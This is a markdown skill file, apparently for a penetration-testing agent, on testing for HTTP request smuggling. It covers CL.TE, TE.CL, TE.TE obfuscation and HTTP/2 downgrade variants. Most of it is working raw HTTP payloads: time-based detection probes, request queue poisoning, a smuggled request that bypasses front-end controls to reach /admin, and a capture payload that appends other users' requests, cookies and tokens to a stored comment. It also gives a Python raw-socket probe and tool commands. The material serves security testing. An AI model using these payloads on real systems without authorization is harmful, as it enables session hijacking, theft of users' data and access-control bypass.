---
name: http_request_smuggling
description: HTTP request smuggling testing covering CL.TE, TE.CL, HTTP/2 downgrade desync, and request queue poisoning chains
---

# HTTP Request Smuggling

HTTP request smuggling exploits discrepancies in how front-end (reverse proxy/CDN/load balancer) and back-end servers parse HTTP request boundaries. By sending an ambiguous request, an attacker can "smuggle" the beginning of a second request that the back-end server processes as part of a subsequent victim's request — hijacking their session, bypassing access controls, or poisoning the request queue.

## Attack Surface

**When to Test**
- Any application behind a reverse proxy, CDN, or load balancer
- Multi-tier architectures: Nginx → Gunicorn, HAProxy → Node.js, CloudFront → ALB → App
- Applications with front-end authentication/WAF bypass as a goal
- Environments where the front-end and back-end may be running different HTTP server software

**Common Front-End / Back-End Pairs**
- Nginx / Gunicorn, uWSGI, uvicorn (Python)
- HAProxy / Apache, Nginx
- AWS CloudFront or ALB / any origin
- Varnish / Apache, Nginx
- Caddy / Go application
- IIS ARR / IIS

## Core Concepts

**Content-Length (CL)**: Specifies body length in bytes.
**Transfer-Encoding (TE)**: Specifies chunked encoding; chunks end with `0\r\n\r\n`.

When front-end and back-end disagree on which header takes precedence, request boundaries become ambiguous.

## Vulnerability Types

### CL.TE (Front-End: Content-Length, Back-End: Transfer-Encoding)

The front-end uses `Content-Length` to forward the full body. The back-end reads the `Transfer-Encoding` header and interprets the body as chunked — stopping at the `0` chunk terminator. The remaining bytes are left in the TCP buffer and prepended to the next request.

**Time-Based Detection Probe:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If the response takes ~10 seconds to arrive → back-end is waiting for the smuggled `X` to complete → CL.TE confirmed.

**Request Queue Poisoning:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled&x=
0

GET /admin HTTP/1.1
X-Ignore: X
```

### TE.CL (Front-End: Transfer-Encoding, Back-End: Content-Length)

The front-end reads TE-chunked encoding and strips it before forwarding. The back-end reads Content-Length and stops early, leaving the tail in the buffer.

**Time-Based Detection Probe:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
~10 second response → TE.CL confirmed.

### TE.TE (Both Parse TE, React Differently to Obfuscation)

Both servers support Transfer-Encoding but one ignores the obfuscated variant:
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding[\t]: chunked
X: X\nTransfer-Encoding: chunked
Content-Encoding: chunked
```

One server processes the obfuscated TE header; the other falls back to Content-Length. The pair then behaves as CL.TE or TE.CL.

### HTTP/2 Downgrade (H2.CL and H2.TE)

Front-end accepts HTTP/2 but translates to HTTP/1.1 for the back-end. If the front-end does not strip or validate `Content-Length` from the HTTP/2 headers before downgrading:

**H2.CL**: Send HTTP/2 request with `content-length` header that doesn't match the actual body length. The back-end uses the CL value, leaving the remainder in the buffer.

**H2.TE**: Send HTTP/2 request with `transfer-encoding: chunked` header. Front-end passes it through; back-end treats as TE-chunked.

Both H2 variants are often exploitable even on servers that have patched CL.TE/TE.CL because HTTP/2 is a separate code path.

## Attack Chains

### Bypass Front-End Access Controls

Smuggle a request to a restricted back-end endpoint:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
The next legitimate request from any user completes the smuggled `GET /admin/users` request, which the back-end processes with that user's headers (including their cookies).

### Capture Victim Requests

Steal another user's request body (including session tokens, CSRF tokens, POST data):
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 266
Transfer-Encoding: chunked

0

POST /post HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

comment=
```
The back-end waits for 500 bytes. The next user's request appends to this body. Retrieve via the application's normal data endpoint (e.g., reading a comment).

## Tools

- **smuggler.py** — Automated detection: `pip install git+https://github.com/defparam/smuggler; python3 smuggler.py -u https://target.com`
- **http2smugl** — HTTP/2 downgrade testing: install Go then `go install github.com/neex/http2smugl@latest`
- **Python `socket`/`ssl`** — Raw socket for precise CL.TE/TE.CL probes (bypass high-level HTTP library normalization):
  ```python
  import socket, ssl
  s = ssl.wrap_socket(socket.socket())
  s.connect(('target.com', 443))
  s.send(b"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX")
  print(s.recv(4096))
  ```
- **Caido** — Observe timing anomalies; send raw requests for manual probing
- **nuclei** — HTTP smuggling templates: `nuclei -t nuclei-templates/vulnerabilities/http-smuggling/`

## Testing Methodology

1. Identify the multi-tier HTTP architecture (CDN, load balancer, reverse proxy type and version from headers)
2. Send CL.TE time-based probe — measure response time; >5s delay = potential CL.TE
3. Send TE.CL time-based probe — measure response time
4. Try TE obfuscation variants (uppercase, tab, double header) for TE.TE
5. Test H2.CL / H2.TE if the front-end accepts HTTP/2 (check via ALPN negotiation)
6. Run `smuggler.py` for automated detection across all variants
7. Once desync confirmed: demonstrate impact — bypass access control to `/admin`, or set up victim request capture
8. Document: front-end/back-end identification, smuggling type (CL.TE/TE.CL/H2.x), PoC request, and captured data or bypassed endpoint

## Pro Tips

- Use raw sockets (Python `socket` module) for probing — high-level HTTP libraries like `requests` and `httpx` normalize headers and prevent sending the malformed requests required for this attack
- CL.TE time-based probe must use a unique endpoint per test — previous probes leave data in the back-end buffer that can confuse subsequent tests; use a fresh URL parameter (`/?x=<random>`) each time
- H2.CL is increasingly common as more CDNs support HTTP/2 but backends remain HTTP/1.1 — always test H2 variants on any CDN-fronted target (CloudFront, Cloudflare, Fastly, Akamai)
- The `smuggler.py` tool handles the tricky timing and covers all TE obfuscation variants automatically — run it first
- A confirmed smuggling vulnerability with access to `/admin` endpoints is typically critical severity even without full victim capture PoC
